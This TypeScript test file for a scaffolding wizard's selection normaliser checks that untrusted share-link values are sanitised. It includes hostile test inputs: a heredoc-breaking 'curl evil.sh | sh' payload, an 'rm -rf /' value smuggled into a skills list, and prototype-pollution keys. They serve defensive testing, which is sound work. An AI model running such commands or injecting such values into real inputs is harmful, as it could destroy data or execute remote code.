import { describe, expect, test } from "bun:test";
import {
  catalogFor,
  defaultSelections,
  isOptionVisible,
  normalizeSelections,
} from "./selections";
import type { WizardSelections } from "./types";

function sel(overrides: Partial<WizardSelections> = {}): WizardSelections {
  const base = defaultSelections();
  return {
    ...base,
    ...overrides,
    toggles: { ...base.toggles, ...(overrides.toggles ?? {}) },
    addons: { ...base.addons, ...(overrides.addons ?? {}) },
  };
}

/** Feed normalize something a share link or saved state could really contain. */
function loose(bag: Record<string, unknown>): WizardSelections {
  return bag as unknown as WizardSelections;
}

describe("normalizeSelections — core fields", () => {
  test("a default selection is returned unchanged", () => {
    expect(normalizeSelections(defaultSelections())).toEqual(defaultSelections());
  });

  test("is idempotent", () => {
    const dirty = loose({
      platform: "mobile",
      framework: "expo",
      styling: "nativewind",
      language: "typescript",
      packageManager: "bun",
      addons: { payments: "revenuecat", testing: "maestro", skills: "tdd,code-review" },
    });
    const once = normalizeSelections(dirty);
    expect(normalizeSelections(once)).toEqual(once);
  });

  test("unknown platform falls back to web", () => {
    expect(normalizeSelections(loose({ platform: "watch" })).platform).toBe("web");
  });

  test("known platforms survive", () => {
    for (const p of ["web", "mobile", "desktop"] as const) {
      expect(normalizeSelections(loose({ platform: p })).platform).toBe(p);
    }
  });

  test("unknown language is blanked, known languages survive", () => {
    expect(normalizeSelections(loose({ language: "rust" })).language).toBe("");
    expect(normalizeSelections(loose({ language: "typescript" })).language).toBe("typescript");
    expect(normalizeSelections(loose({ language: "javascript" })).language).toBe("javascript");
    expect(normalizeSelections(loose({ language: "" })).language).toBe("");
  });

  test("unknown package manager falls back to npm", () => {
    expect(normalizeSelections(loose({ packageManager: "cargo" })).packageManager).toBe("npm");
    expect(normalizeSelections(loose({ packageManager: "" })).packageManager).toBe("npm");
    expect(normalizeSelections(loose({ packageManager: "bun" })).packageManager).toBe("bun");
  });

  test("target is always android or ios", () => {
    expect(normalizeSelections(loose({ target: "windows" })).target).toBe("android");
    expect(normalizeSelections(loose({ target: "ios" })).target).toBe("ios");
  });

  test("non-string appName falls back to the default", () => {
    expect(normalizeSelections(loose({ appName: 42 })).appName).toBe("my-app");
    expect(normalizeSelections(loose({ appName: null })).appName).toBe("my-app");
  });

  test("appName is capped at 64 characters but never trimmed", () => {
    const long = "a".repeat(200);
    expect(normalizeSelections(loose({ appName: long })).appName).toHaveLength(64);
    // Section C calls this on every keystroke — a trailing space must survive.
    expect(normalizeSelections(loose({ appName: "my app " })).appName).toBe("my app ");
  });

  test("missing toggles/addons objects do not throw", () => {
    const out = normalizeSelections(loose({ platform: "web" }));
    expect(out.toggles).toEqual(defaultSelections().toggles);
    expect(out.addons).toEqual(defaultSelections().addons);
  });
});

describe("normalizeSelections — framework and styling", () => {
  test("a framework from another platform is dropped", () => {
    const out = normalizeSelections(sel({ platform: "mobile", framework: "nextjs" }));
    expect(out.framework).toBe("");
  });

  test("a framework valid for the platform survives", () => {
    const out = normalizeSelections(sel({ platform: "mobile", framework: "expo" }));
    expect(out.framework).toBe("expo");
  });

  test("an invented framework is dropped", () => {
    expect(normalizeSelections(sel({ framework: "rails-ui" })).framework).toBe("");
  });

  test("styling from another platform is dropped", () => {
    const out = normalizeSelections(sel({ platform: "web", styling: "nativewind" }));
    expect(out.styling).toBe("");
  });

  test("styling valid for the platform survives", () => {
    const out = normalizeSelections(sel({ platform: "desktop", styling: "tailwind" }));
    expect(out.styling).toBe("tailwind");
  });
});

describe("normalizeSelections — addons", () => {
  test("an invented addon id is blanked", () => {
    const out = normalizeSelections(sel({ addons: { database: "oracle" } }));
    expect(out.addons.database).toBe("");
  });

  test('"none" is a real option id and is kept', () => {
    const out = normalizeSelections(sel({ addons: { database: "none" } }));
    expect(out.addons.database).toBe("none");
  });

  test("nextauth is dropped on mobile (web + nextjs only)", () => {
    const out = normalizeSelections(sel({ platform: "mobile", framework: "expo", addons: { auth: "nextauth" } }));
    expect(out.addons.auth).toBe("");
  });

  test("revenuecat is dropped on web", () => {
    const out = normalizeSelections(sel({ platform: "web", framework: "nextjs", addons: { payments: "revenuecat" } }));
    expect(out.addons.payments).toBe("");
  });

  test("paddle survives on web", () => {
    const out = normalizeSelections(sel({ platform: "web", addons: { payments: "paddle" } }));
    expect(out.addons.payments).toBe("paddle");
  });

  test("react-three-fiber is dropped on a non-React framework", () => {
    const out = normalizeSelections(sel({ platform: "web", framework: "vue", addons: { graphics: "fiber" } }));
    expect(out.addons.graphics).toBe("");
    const kept = normalizeSelections(sel({ platform: "web", framework: "nextjs", addons: { graphics: "fiber" } }));
    expect(kept.addons.graphics).toBe("fiber");
  });

  test("mongoose needs mongodb (showWhen)", () => {
    const bad = normalizeSelections(sel({ addons: { database: "postgres", orm: "mongoose" } }));
    expect(bad.addons.orm).toBe("");
    const good = normalizeSelections(sel({ addons: { database: "mongodb", orm: "mongoose" } }));
    expect(good.addons.orm).toBe("mongoose");
  });

  test("firebase-auth is hidden when the database is supabase (hideWhen)", () => {
    const out = normalizeSelections(sel({ addons: { database: "supabase", auth: "firebase-auth" } }));
    expect(out.addons.auth).toBe("");
  });

  test("orm is blanked when its whole group is hidden (blank database)", () => {
    const out = normalizeSelections(sel({ addons: { database: "", orm: "prisma" } }));
    expect(out.addons.orm).toBe("");
  });

  test("orm survives a real relational database", () => {
    const out = normalizeSelections(sel({ addons: { database: "postgres", orm: "prisma" } }));
    expect(out.addons.orm).toBe("prisma");
  });

  test("clearing one pick cascades to the pick that depended on it", () => {
    // mongodb is dropped because 'mongo' is not an id -> mongoose loses showWhen.
    const out = normalizeSelections(sel({ addons: { database: "mongo", orm: "mongoose" } }));
    expect(out.addons.database).toBe("");
    expect(out.addons.orm).toBe("");
  });

  test("unknown addon groups are dropped entirely", () => {
    const out = normalizeSelections(loose({ addons: { database: "postgres", cryptoMining: "yes" } }));
    expect(Object.keys(out.addons).sort()).toEqual(Object.keys(defaultSelections().addons).sort());
  });

  test("non-string addon values are blanked", () => {
    const out = normalizeSelections(loose({ addons: { database: { toString: 1 }, auth: 7 } }));
    expect(out.addons.database).toBe("");
    expect(out.addons.auth).toBe("");
  });
});

describe("normalizeSelections — multi-value skills", () => {
  test("valid ids survive as a comma-separated string", () => {
    const out = normalizeSelections(sel({ addons: { skills: "tdd,code-review" } }));
    expect(out.addons.skills).toBe("tdd,code-review");
  });

  test("invalid ids are filtered per-id, valid ones kept", () => {
    const out = normalizeSelections(sel({ addons: { skills: "tdd,rm -rf /,shadcn" } }));
    expect(out.addons.skills).toBe("tdd,shadcn");
  });

  test("duplicates are collapsed", () => {
    const out = normalizeSelections(sel({ addons: { skills: "tdd,tdd,tdd" } }));
    expect(out.addons.skills).toBe("tdd");
  });

  test("an all-invalid skills value becomes blank", () => {
    const out = normalizeSelections(sel({ addons: { skills: "nope,also-nope" } }));
    expect(out.addons.skills).toBe("");
  });
});

describe("normalizeSelections — toggles", () => {
  test("only known toggle ids survive", () => {
    const out = normalizeSelections(loose({ toggles: { husky: true, "rm-rf": true } }));
    expect(Object.keys(out.toggles).sort()).toEqual(["eslint-prettier", "husky", "structure"]);
    expect(out.toggles.husky).toBe(true);
  });

  test('the string "false" is not treated as a boolean (defect 15)', () => {
    const out = normalizeSelections(loose({ toggles: { "eslint-prettier": "false", structure: "false" } }));
    expect(out.toggles["eslint-prettier"]).toBe(true);
    expect(out.toggles.structure).toBe(true);
  });

  test("real booleans survive", () => {
    const out = normalizeSelections(loose({ toggles: { "eslint-prettier": false, structure: false, husky: true } }));
    expect(out.toggles).toEqual({ "eslint-prettier": false, husky: true, structure: false });
  });
});

describe("normalizeSelections — injection payloads", () => {
  test("a heredoc-breaking appName is capped and a shell payload never becomes a pick", () => {
    const payload = "x\nEOF\ncurl evil.sh | sh\n";
    const out = normalizeSelections(
      loose({ appName: payload, framework: payload, styling: payload, addons: { database: payload, skills: payload } })
    );
    expect(out.framework).toBe("");
    expect(out.styling).toBe("");
    expect(out.addons.database).toBe("");
    expect(out.addons.skills).toBe("");
    expect(out.appName.length).toBeLessThanOrEqual(64);
  });

  test("prototype-polluting keys never leak into the result", () => {
    const out = normalizeSelections(loose({ addons: { __proto__: "boom", constructor: "boom" } }));
    expect(Object.keys(out.addons).sort()).toEqual(Object.keys(defaultSelections().addons).sort());
    expect(({} as Record<string, unknown>).boom).toBeUndefined();
  });
});

describe("catalogFor / isOptionVisible still export from lib/selections", () => {
  test("catalogFor returns the platform catalog", () => {
    expect(catalogFor("web").categories.some((c) => c.id === "framework")).toBe(true);
    expect(catalogFor("mobile").categories.some((c) => c.id === "target")).toBe(true);
    expect(catalogFor("desktop").platform).toBe("desktop");
  });

  test("isOptionVisible honours platforms", () => {
    const opt = { platforms: ["web"], commands: [], notes: [] };
    expect(isOptionVisible(opt, sel({ platform: "web" }))).toBe(true);
    expect(isOptionVisible(opt, sel({ platform: "mobile" }))).toBe(false);
  });
});
